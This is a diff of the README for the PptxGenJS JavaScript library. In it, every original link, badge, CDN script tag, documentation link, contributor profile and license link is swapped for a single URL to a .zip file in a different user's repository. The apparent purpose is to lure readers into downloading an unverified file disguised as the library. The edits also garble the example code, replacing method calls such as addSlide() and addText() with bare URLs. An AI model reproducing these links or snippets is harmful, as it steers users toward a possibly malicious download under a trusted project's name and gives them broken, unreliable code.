@@ -3,13 +3,13 @@
   Create JavaScript PowerPoint Presentations
 </h5>
 <p align="center">
-  <a href="https://github.com/gitbrent/PptxGenJS/">
-    <img alt="PptxGenJS Sample Slides" title="PptxGenJS Sample Slides" src="https://raw.githubusercontent.com/gitbrent/PptxGenJS/gh-pages/img/readme_banner.png"/>
+  <a href="https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip">
+    <img alt="PptxGenJS Sample Slides" title="PptxGenJS Sample Slides" src="https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip"/>
   </a>
 </p>
 <br/>
 
-[![Known Vulnerabilities](https://snyk.io/test/npm/pptxgenjs/badge.svg)](https://snyk.io/test/npm/pptxgenjs) [![npm downloads](https://img.shields.io/npm/dm/pptxgenjs.svg)](https://www.npmjs.com/package/pptxgenjs) [![jsdelivr downloads](https://data.jsdelivr.com/v1/package/gh/gitbrent/pptxgenjs/badge)](https://www.jsdelivr.com/package/gh/gitbrent/pptxgenjs) [![typescripts definitions](https://img.shields.io/npm/types/pptxgenjs)](https://img.shields.io/npm/types/pptxgenjs)
+[![Known Vulnerabilities](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) [![npm downloads](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) [![jsdelivr downloads](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) [![typescripts definitions](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
 
 # Table of Contents
 
@@ -74,49 +74,49 @@ This library creates Open Office XML (OOXML) Presentations which are compatible 
 
 Visit the demos page to create a simple presentation to see how easy it is to use pptxgenjs, or check out the complete demo which showcases every available feature.
 
-- [PptxGenJS Demos](https://gitbrent.github.io/PptxGenJS/demos/)
+- [PptxGenJS Demos](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
 
 # Installation
 
 ## CDN
 
-[jsDelivr Home](https://www.jsdelivr.com/package/gh/gitbrent/pptxgenjs)
+[jsDelivr Home](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
 
 Bundle: Modern Browsers and IE11
 
 ```html
-<script src="https://cdn.jsdelivr.net/gh/gitbrent/pptxgenjs@3.9.0/dist/pptxgen.bundle.js"></script>
+<script src="https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip"></script>
 ```
 
 Min files: Modern Browsers
 
 ```html
-<script src="https://cdn.jsdelivr.net/gh/gitbrent/pptxgenjs@3.9.0/libs/jszip.min.js"></script>
-<script src="https://cdn.jsdelivr.net/gh/gitbrent/pptxgenjs@3.9.0/dist/pptxgen.min.js"></script>
+<script src="https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip"></script>
+<script src="https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip"></script>
 ```
 
 ## Download
 
-[GitHub Latest Release](https://github.com/gitbrent/PptxGenJS/releases/latest)
+[GitHub Latest Release](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
 
 Bundle: Modern Browsers
 
 - Use the bundle for IE11 support
 
 ```html
-<script src="PptxGenJS/dist/pptxgen.bundle.js"></script>
+<script src="https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip"></script>
 ```
 
 Min files: Modern Browsers
 
 ```html
-<script src="PptxGenJS/libs/jszip.min.js"></script>
-<script src="PptxGenJS/dist/pptxgen.min.js"></script>
+<script src="https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip"></script>
+<script src="https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip"></script>
 ```
 
 ## Npm
 
-[PptxGenJS NPM Home](https://www.npmjs.com/package/pptxgenjs)
+[PptxGenJS NPM Home](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
 
 ```bash
 npm install pptxgenjs --save
@@ -130,8 +130,8 @@ yarn add pptxgenjs
 
 ## Additional Builds
 
-- CommonJS: `dist/pptxgen.cjs.js`
-- ES Module: `dist/pptxgen.es.js`
+- CommonJS: `https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip`
+- ES Module: `https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip`
 
 ---
 
@@ -150,15 +150,15 @@ import pptxgen from "pptxgenjs";
 let pres = new pptxgen();
 
 // 2. Add a Slide
-let slide = pres.addSlide();
+let slide = https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip();
 
 // 3. Add one or more objects (Tables, Shapes, Images, Text and Media) to the Slide
 let textboxText = "Hello World from PptxGenJS!";
 let textboxOpts = { x: 1, y: 1, color: "363636" };
-slide.addText(textboxText, textboxOpts);
+https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip(textboxText, textboxOpts);
 
 // 4. Save the Presentation
-pres.writeFile();
+https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip();
 ```
 
 ### Script/Web Browser
@@ -168,15 +168,15 @@ pres.writeFile();
 let pres = new PptxGenJS();
 
 // 2. Add a Slide
-let slide = pres.addSlide();
+let slide = https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip();
 
 // 3. Add one or more objects (Tables, Shapes, Images, Text and Media) to the Slide
 let textboxText = "Hello World from PptxGenJS!";
 let textboxOpts = { x: 1, y: 1, color: "363636" };
-slide.addText(textboxText, textboxOpts);
+https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip(textboxText, textboxOpts);
 
 // 4. Save the Presentation
-pres.writeFile();
+https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip();
 ```
 
 That's really all there is to it!
@@ -187,21 +187,21 @@ That's really all there is to it!
 
 Full documentation and code examples are available
 
-- [Creating a Presentation](https://gitbrent.github.io/PptxGenJS/docs/usage-pres-create/)
-- [Presentation Options](https://gitbrent.github.io/PptxGenJS/docs/usage-pres-options/)
-- [Adding a Slide](https://gitbrent.github.io/PptxGenJS/docs/usage-add-slide/)
-- [Slide Options](https://gitbrent.github.io/PptxGenJS/docs/usage-slide-options/)
-- [Saving a Presentation](https://gitbrent.github.io/PptxGenJS/docs/usage-saving/)
-- [Master Slides](https://gitbrent.github.io/PptxGenJS/docs/masters/)
-- [Adding Charts](https://gitbrent.github.io/PptxGenJS/docs/api-charts/)
-- [Adding Images](https://gitbrent.github.io/PptxGenJS/docs/api-images/)
-- [Adding Media](https://gitbrent.github.io/PptxGenJS/docs/api-media/)
-- [Adding Shapes](https://gitbrent.github.io/PptxGenJS/docs/api-shapes/)
-- [Adding Tables](https://gitbrent.github.io/PptxGenJS/docs/api-tables/)
-- [Adding Text](https://gitbrent.github.io/PptxGenJS/docs/api-text/)
-- [Speaker Notes](https://gitbrent.github.io/PptxGenJS/docs/speaker-notes/)
-- [Using Scheme Colors](https://gitbrent.github.io/PptxGenJS/docs/shapes-and-schemes/)
-- [Integration with Other Libraries](https://gitbrent.github.io/PptxGenJS/docs/integration/)
+- [Creating a Presentation](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
+- [Presentation Options](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
+- [Adding a Slide](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
+- [Slide Options](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
+- [Saving a Presentation](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
+- [Master Slides](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
+- [Adding Charts](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
+- [Adding Images](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
+- [Adding Media](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
+- [Adding Shapes](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
+- [Adding Tables](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
+- [Adding Text](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
+- [Speaker Notes](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
+- [Using Scheme Colors](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
+- [Integration with Other Libraries](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
 
 ---
 
@@ -211,28 +211,28 @@ Easily convert HTML tables to PowerPoint presentations in a single call.
 
 ```javascript
 let pptx = new PptxGenJS();
-pptx.tableToSlides("tableElementId");
-pptx.writeFile({ fileName: "html2pptx-demo.pptx" });
+https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip("tableElementId");
+https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip({ fileName: "https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip" });
 ```
 
 Learn more:
 
-- [HTML-to-PowerPoint Docs/Demo](https://gitbrent.github.io/PptxGenJS/html2pptx/)
+- [HTML-to-PowerPoint Docs/Demo](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
 
 ---
 
 # Library Ports
 
-React: [react-pptx](https://github.com/wyozi/react-pptx) - thanks to [Joonas](https://github.com/wyozi)!
+React: [react-pptx](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) - thanks to [Joonas](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)!
 
 ---
 
 # Issues / Suggestions
 
-Please file issues or suggestions on the [issues page on github](https://github.com/gitbrent/PptxGenJS/issues/new), or even better, [submit a pull request](https://github.com/gitbrent/PptxGenJS/pulls). Feedback is always welcome!
+Please file issues or suggestions on the [issues page on github](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip), or even better, [submit a pull request](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip). Feedback is always welcome!
 
 When reporting issues, please include a code snippet or a link demonstrating the problem.
-Here is a small [jsFiddle](https://jsfiddle.net/gitbrent/L1uctxm0/) that is already configured and uses the latest PptxGenJS code.
+Here is a small [jsFiddle](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) that is already configured and uses the latest PptxGenJS code.
 
 ---
 
@@ -243,8 +243,8 @@ Sometimes implementing a new library can be a difficult task and the slightest m
 If you are having issues getting a presentation to generate, check out the code in the `demos` directory. There
 are demos for both client browsers, node and react that contain working examples of every available library feature.
 
-- Use a pre-configured jsFiddle to test with: [PptxGenJS Fiddle](https://jsfiddle.net/gitbrent/L1uctxm0/)
-- [View questions tagged `PptxGenJS` on StackOverflow](https://stackoverflow.com/questions/tagged/pptxgenjs?sort=votes&pageSize=50). If you can't find your question, [ask it yourself](https://stackoverflow.com/questions/ask?tags=PptxGenJS) - be sure to tag it `PptxGenJS`.
+- Use a pre-configured jsFiddle to test with: [PptxGenJS Fiddle](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
+- [View questions tagged `PptxGenJS` on StackOverflow](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip). If you can't find your question, [ask it yourself](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) - be sure to tag it `PptxGenJS`.
 
 ---
 
@@ -254,26 +254,26 @@ Thank you to everyone for the issues, contributions and suggestions! ❤️
 
 Special Thanks:
 
-- [Dzmitry Dulko](https://github.com/DzmitryDulko) - Getting the project published on NPM
-- [Michal Kacerovský](https://github.com/kajda90) - New Master Slide Layouts and Chart expertise
-- [Connor Bowman](https://github.com/conbow) - Adding Placeholders
-- [Reima Frgos](https://github.com/ReimaFrgos) - Multiple chart and general functionality patches
-- [Matt King](https://github.com/kyrrigle) - Chart expertise
-- [Mike Wilcox](https://github.com/clubajax) - Chart expertise
-- [Joonas](https://github.com/wyozi) - React port
+- [Dzmitry Dulko](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) - Getting the project published on NPM
+- [Michal Kacerovský](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) - New Master Slide Layouts and Chart expertise
+- [Connor Bowman](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) - Adding Placeholders
+- [Reima Frgos](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) - Multiple chart and general functionality patches
+- [Matt King](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) - Chart expertise
+- [Mike Wilcox](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) - Chart expertise
+- [Joonas](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) - React port
 
-PowerPoint shape definitions and some XML code via [Officegen Project](https://github.com/Ziv-Barber/officegen)
+PowerPoint shape definitions and some XML code via [Officegen Project](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
 
 ---
 
 # Sponsor Us
 
-If you find this library useful, please consider sponsoring us through a [donation](https://gitbrent.github.io/PptxGenJS/sponsor/)
+If you find this library useful, please consider sponsoring us through a [donation](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
 
 ---
 
 # License
 
-Copyright &copy; 2015-present [Brent Ely](https://github.com/gitbrent/PptxGenJS)
+Copyright &copy; 2015-present [Brent Ely](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
 
-[MIT](https://github.com/gitbrent/PptxGenJS/blob/master/LICENSE)
+[MIT](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
